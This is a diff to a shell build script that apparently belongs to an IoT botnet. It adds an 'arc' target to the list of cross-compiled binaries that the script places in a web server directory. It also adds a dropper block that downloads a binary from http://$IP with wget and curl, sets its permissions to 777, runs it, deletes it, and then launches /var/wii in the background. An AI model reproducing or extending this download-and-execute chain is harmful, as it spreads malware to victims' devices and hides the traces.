@@ -49,7 +49,7 @@ arc-linux-gcc *.c -o arc -pthread -DARCH_arc -static -O3 -ffunction-sections -Wl
 sh4-linux-gnu-gcc *.c -o sh4 -pthread -DARCH_sh4 -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
 
 #move binaries to apache2 dir
-mv mipsel mips i686 armhf aarch64 m68k arm sparc powerpc64 x86_64 sh4 /var/www/html
+mv mipsel mips i686 armhf aarch64 m68k arm sparc powerpc64 x86_64 sh4 arc /var/www/html
 
 cd ..
 
@@ -111,6 +111,11 @@ curl http://$IP/sh4 -o sh4;
 chmod 777 sh4;
 ./sh4;
 rm -rf sh4;
+wget http://$IP/arc;
+curl http://$IP/arc -o arc;
+chmod 777 arc;
+./arc;
+rm -rf arc;
 /var/wii 2>/dev/null &
 EOF
 
